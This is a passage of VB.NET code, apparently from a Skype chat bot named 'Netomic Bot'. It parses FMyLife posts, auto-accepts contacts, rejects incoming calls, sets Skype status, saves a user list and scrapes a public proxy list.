        '<div class="post article" id="21176835"><p><a href="/miscellaneous/21176835" class="fmllink">Today, I decided to tell my family, including my husband, that I'm pregnant.</a><a href="/miscellaneous/21176835" class="fmllink"> Their reaction was basically a "meh" before returning to watching the World Cup.</a><a href="/miscellaneous/21176835" class="fmllink"> FML</a></p><div class="date"><div class="left_part"><a href="/miscellaneous/21176835" id="article_21176835" name="/resume/article/21176835" class="jTip">#21176835</a><br><span class="dyn-comments">59 comments</span></div><div class="right_part"><p><span class="dyn-vote-j" id="vote21176835"><a href="javascript:;" onclick="vote('21176835','9933','agree');">I agree, your life sucks</a> (<span class="dyn-vote-j-data">9938</span>)</span> - <span class="dyn-vote-t" id="votebf21176835"><a href="javascript:;" onclick="vote('21176835','1843','deserve');" class="bf">you deserved it</a> (<span class="dyn-vote-t-data">1843</span>)</span></p><p>On 06/16/2014 at 2:50pm - <a class="liencat" href="/miscellaneous">misc</a> - by FMeeee (<a href="/gender/woman" class="light">woman</a>) - <a href="/country/Portugal" class="liencat">Portugal</a> (<a href="/region/Aveiro" class="light">Aveiro</a>)</p></div></div><div class="more" id="more21176835"><div class="fb-like fb_iframe_widget" data-href="http://www.fmylife.com/miscellaneous/21176835" data-send="false" data-width="100" data-height="21" data-layout="button_count" data-show-faces="false" data-font="lucida grande" fb-xfbml-state="rendered" fb-iframe-plugin-query="app_id=400710503290105&amp;font=lucida%20grande&amp;height=21&amp;href=http%3A%2F%2Fwww.fmylife.com%2Fmiscellaneous%2F21176835&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=100" style="display: block;"><span style="vertical-align: bottom; width: 78px; height: 20px;"><iframe name="f5b4465" width="100px" height="21px" frameborder="0" allowtransparency="true" scrolling="no" title="fb:like Facebook Social Plugin" src="http://www.facebook.com/plugins/like.php?app_id=400710503290105&amp;channel=http%3A%2F%2Fstatic.ak.facebook.com%2Fconnect%2Fxd_arbiter%2FV80PAcvrynR.js%3Fversion%3D41%23cb%3Df249fdc3cc%26domain%3Dwww.fmylife.com%26origin%3Dhttp%253A%252F%252Fwww.fmylife.com%252Ff3e9bf69cc%26relation%3Dparent.parent&amp;font=lucida%20grande&amp;height=21&amp;href=http%3A%2F%2Fwww.fmylife.com%2Fmiscellaneous%2F21176835&amp;layout=button_count&amp;locale=en_US&amp;sdk=joey&amp;send=false&amp;show_faces=false&amp;width=100" class="" style="border: none; visibility: visible; width: 78px; height: 20px;"></iframe></span></div><a href="javascript:;" onclick="return twitter_click('http://www.fmylife.com/miscellaneous/21176835#new','21176835');" class="tooltips t_twitter"></a></div>
        Dim i As Integer = 1
        Dim words2 As String() = RichTextBox1.Text.Split(New Char() {"<div class=" & Chr(34) & "post articl" & Chr(34) & "e"c, ControlChars.Lf, ControlChars.Cr, ControlChars.Tab})
        For Each word As String In words2
            If word.Contains("class=" & Chr(34) & "fmllink" & Chr(34)) Then
                'a href="/miscellaneous/21176835" class="fmllink">
                Dim id As String = word.Split("/miscellaneous/").Last
                Dim txt As String = id.Split(Chr(34) + "class=" + Chr(34) + "fmllink" + Chr(34) + ">").Last
                txt = txt.Replace(">", "")
                txt = txt.Replace("&quot;", Chr(34))
                id = id.Split(Chr(34) + "class=" + Chr(34) + "fmllink" + Chr(34) + ">").First
                If Not txt.Contains("FML") Then
                    Try
                        ListView5.Items(i).SubItems(1).Text += txt
                    Catch ex As Exception
                        Dim objitem As ListViewItem = ListView5.Items.Add(id)
                        objitem.SubItems.Add(txt)
                    End Try

                Else
                    i += 1
                End If
                'RichTextBox2.Text += word + vbNewLine
            End If
        Next

    End Sub
    Public Sub skype_NewUsers()
        If AAC_Checkbox.Checked = True Then
            If nSkype.UsersWaitingAuthorization.Count > 0 Then
                Dim currentUserAdding$ = nSkype.UsersWaitingAuthorization.Item(nSkype.UsersWaitingAuthorization.Count).Handle
                nSkype.UsersWaitingAuthorization.Item(nSkype.UsersWaitingAuthorization.Count).IsAuthorized = True
                nSkype.SendMessage(currentUserAdding, "Welcome to Netomic Bot! In order to use our bot please type .register")
            End If
        End If

    End Sub

    Private Sub NsButton2_Click(sender As Object, e As EventArgs) Handles SDS_Button.Click
        If DisplayStatus_Combobox.SelectedItem = "Online" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOnline
        End If
        If DisplayStatus_Combobox.SelectedItem = "Busy" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusDoNotDisturb
        End If
        If DisplayStatus_Combobox.SelectedItem = "Away" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusAway
        End If
        If DisplayStatus_Combobox.SelectedItem = "Offline" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOffline
        End If
        If DisplayStatus_Combobox.SelectedItem = "Invisible" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusInvisible
        End If
    End Sub

    Private Sub SCS1_Button_Click(sender As Object, e As EventArgs) Handles SCS_Button.Click
        If ClientStatus_Combobox.SelectedItem = "Online" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusOnline
            nSkype.CurrentUserProfile.MoodText = "Status: Online  |  Type .register to active your account"
        End If
        If ClientStatus_Combobox.SelectedItem = "Maintenance" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusAway
            nSkype.CurrentUserProfile.MoodText = "Status: Maintenance  |  Netomic Bot is currently under maintenace"
        End If
        If ClientStatus_Combobox.SelectedItem = "Offline" Then
            nSkype.CurrentUserStatus = SKYPE4COMLib.TUserStatus.cusInvisible
            nSkype.CurrentUserProfile.MoodText = "Status: Offline  |  Netomic Bot is currently offline"
        End If
    End Sub
    Private Sub Set_textbox_Click(sender As Object, e As EventArgs) Handles Set_textbox.Click
        TRIG = Trigger_textbox.Text
    End Sub
    Private Sub oSkype_CallStatus(pCall As SKYPE4COMLib.Call, Status As SKYPE4COMLib.TCallStatus) Handles nSkype.CallStatus
        If ARC_checkbox.Checked = True Then
            If Status = SKYPE4COMLib.TCallStatus.clsRinging Then
                Try
                    pCall.Finish()
                Catch ex As Exception
                End Try
            End If
        End If
    End Sub

    Private Sub Load_button_Click(sender As Object, e As EventArgs) Handles Load_button.Click
        Dim openfile = New OpenFileDialog()
        openfile.Filter = "Text (*.txt)|*.txt"
        If (openfile.ShowDialog() = System.Windows.Forms.DialogResult.OK) Then
            Dim myfile As String = openfile.FileName
            Dim allLines As String() = File.ReadAllLines(myfile)
            For Each line As String In allLines
                Users_listview.AddItem(line)
                Users_richtextbox.Text += line
            Next
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim filepath As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments
        If File.Exists(filepath & "\database.txt") Then
            File.Delete(filepath & "\database.txt")
            Dim objWriter As New System.IO.StreamWriter(filepath & "\database.txt")
            For Each item As NSListView.NSListViewItem In Users_listview.Items
                objWriter.WriteLine(item.Text)
            Next
            objWriter.Close()
        End If
        If Not File.Exists(filepath & "\database.txt") Then
            Dim objWriter As New System.IO.StreamWriter(filepath & "\database.txt")
            For Each item As NSListView.NSListViewItem In Users_listview.Items
                objWriter.WriteLine(item.Text)
            Next
            objWriter.Close()
        End If
    End Sub

    Private Sub NsListView1_Click(sender As Object, e As EventArgs) Handles NsListView1.Click
        If NsListView1.SelectedItems.Count > 0 Then
            RichTextBox2.Text = NsListView1.SelectedItems(0).Text
        End If
    End Sub
    Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
        target = value
        Return value
    End Function
    Sub hidemyass()
        Dim i As Integer = 1
        Dim l As New List(Of String)()
        Dim s
        Dim say As Integer = 0
        Do Until i = 1

            Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("https://hidemyass.com/proxy-list/1")
            Dim response As System.Net.HttpWebResponse = request.GetResponse
            Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
            Dim rssourcecode As String = sr.ReadToEnd


            For Each s In Regex.Matches(rssourcecode, "(?:<td class=""leftborder timestamp""(?s).+?<style>)((?s).+?)\s*<td>\s+(\d{2,5})</td>\s*<td(.*)</td>\s*<td>(.*)>\s*<div(.*)</div>\s*</div>\s*</td>\s*<td>(.*)>\s*<div(.*)</div>").Cast(Of Match)().[Select](Function(m) New String() {m.Groups(1).Value, m.Groups(2).Value, m.Groups(3).Value, m.Groups(5).Value, m.Groups(7).Value})
                Regex.Matches(s(0), "\.([^\{]+)\{([^\}]+)\}").Cast(Of Match)().ToList().ForEach(Function(m) InlineAssignHelper(s(0), s(0).Replace(String.Format("class=""{0}""", m.Groups(1).Value), String.Format("style=""{0}""", m.Groups(2).Value))))

                Dim resim As String = String.Concat(Regex.Matches(s(2), "<img src=""(.*)"" alt=""flag"" /> (.*)</span>").Cast(Of Match)().Select(Function(m) m.Groups(1).Value))

                ListView2.Refresh()

                With (ListView2.Items.Add(String.Concat(Regex.Matches(Regex.Replace(Regex.Replace(s(0), "<(span|div) style=""display:none"">[\d\.]+</\1>", String.Empty).Remove(0, s(0).IndexOf("/style>")), "class=""\d+""", String.Empty), "[\d\.]+").Cast(Of Match)().[Select](Function(m) m.Value))))
                    .SubItems.Add(s(1))
                    .SubItems.Add(String.Concat(Regex.Matches(s(2), "<img src=""(.*)"" alt=""flag"" /> (.*)</span>").Cast(Of Match)().Select(Function(m) m.Groups(1).Value)))
                    .SubItems.Add(String.Concat(Regex.Matches(s(2), "<img src=""(.*)"" alt=""flag"" /> (.*)</span>").Cast(Of Match)().Select(Function(m) m.Groups(2).Value)))
                    .SubItems.Add(String.Concat(Regex.Matches(s(3), "style=""width:(.*)%").Cast(Of Match)().Select(Function(m) m.Groups(1).Value)))
                    .SubItems.Add(String.Concat(Regex.Matches(s(4), "style=""width:(.*)%").Cast(Of Match)().Select(Function(m) m.Groups(1).Value)))
                End With
                'ListView_SetSubItemImageIndex(listview2.Handle, say, listview2.Columns(3).Index, say)
                MsgBox(ListView2.Items(0).SubItems(0).Text & ":" & ListView2.Items(0).SubItems(1).Text)
            Next
            i = i + 1
            Label1.Text = ListView2.Items.Count
            ListView2.ListViewItemSorter = New  _
               ListViewComparer(4, SortOrder.Descending)
            ListView2.Sort()
        Loop
    End Sub
    Function getproxies()


        Dim max As String = 6
        Dim l As New List(Of String)()
        Dim s
        Dim Ip As Match, resm As Match, resm1 As Match, yuzde1 As Match, yuzde2 As Match
        Dim i As Integer = 1
        Dim say As Integer = 0
        ListView2.Refresh()
        Dim i3 As Integer = 0
        For Each s In Regex.Matches(TextBox1.Text, "(?:<td class=""leftborder timestamp""(?s).+?<style>)((?s).+?)\s*<td>\s+(\d{2,5})</td>\s*<td(.*)</td>\s*<td>(.*)>\s*<div(.*)</div>\s*</div>\s*</td>\s*<td>(.*)>\s*<div(.*)</div>").Cast(Of Match)().[Select](Function(m) New String() {m.Groups(1).Value, m.Groups(2).Value, m.Groups(3).Value, m.Groups(5).Value, m.Groups(7).Value})
            If Not i3 = max Then
                Regex.Matches(s(0), "\.([^\{]+)\{([^\}]+)\}").Cast(Of Match)().ToList().ForEach(Function(m) InlineAssignHelper(s(0), s(0).Replace(String.Format("class=""{0}""", m.Groups(1).Value), String.Format("style=""{0}""", m.Groups(2).Value))))

                ' Ip = String.Concat(Regex.Matches(Regex.Replace(Regex.Replace(s(0), "<(span|div) style=""display:none"">[\d\.]+</\1>", String.Empty).Remove(0, s(0).IndexOf("/style>")), "class=""\d+""", String.Empty), "[\d\.]+").Cast(Of Match)().[Select](Function(m) m.Value)))
                resm = Regex.Match(s(2), "<img src=""(.*)"" alt=""flag"" /> (.*)</span>") '.Cast(Of Match)().Select(Function(m) m.Groups(1).Value)
                resm1 = Regex.Match(s(2), "<img src=""(.*)"" alt=""flag"" /> (.*)</span>")
                yuzde1 = Regex.Match(s(3), "style=""width:(.*)%")
                yuzde2 = Regex.Match(s(4), "style=""width:(.*)%")

                Dim resim As String = String.Concat(Regex.Matches(s(2), "<img src=""(.*)"" alt=""flag"" /> (.*)</span>").Cast(Of Match)().Select(Function(m) m.Groups(1).Value))

                With (ListView2.Items.Add(String.Concat(Regex.Matches(Regex.Replace(Regex.Replace(s(0), "<(span|div) style=""display:none"">[\d\.]+</\1>", String.Empty).Remove(0, s(0).IndexOf("/style>")), "class=""\d+""", String.Empty), "[\d\.]+").Cast(Of Match)().[Select](Function(m) m.Value))))
                    .SubItems.Add(s(1))
                    .SubItems.Add(resm.Groups(1).Value)
                    .SubItems.Add(resm.Groups(2).Value)
                    .SubItems.Add(yuzde1.Groups(1).Value)
                    .SubItems.Add(yuzde2.Groups(1).Value)
                End With
                'ListView_SetSubItemImageIndex(listview2.Handle, say, listview2.Columns(3).Index, say)
                If i3 = 0 Then
                    p1 = ListView2.Items(0).SubItems(0).Text & ":" & ListView2.Items(0).SubItems(1).Text
                End If
                If i3 = 1 Then
                    p2 = ListView2.Items(1).SubItems(0).Text & ":" & ListView2.Items(1).SubItems(1).Text
                End If
                If i3 = 2 Then
                    p3 = ListView2.Items(2).SubItems(0).Text & ":" & ListView2.Items(2).SubItems(1).Text
                End If
                If i3 = 3 Then
                    p4 = ListView2.Items(3).SubItems(0).Text & ":" & ListView2.Items(3).SubItems(1).Text
                End If
                If i3 = 4 Then
                    p5 = ListView2.Items(4).SubItems(0).Text & ":" & ListView2.Items(4).SubItems(1).Text
                End If
                i3 += 1
            End If
        Next

        i = i + 1
        Label1.Text = ListView2.Items.Count
        ListView2.ListViewItemSorter = New  _
           ListViewComparer(4, SortOrder.Descending)
        ListView2.Sort()
    End Function

    Private Sub TabPage3_Click(sender As Object, e As EventArgs) Handles TabPage3.Click

    End Sub
End Class
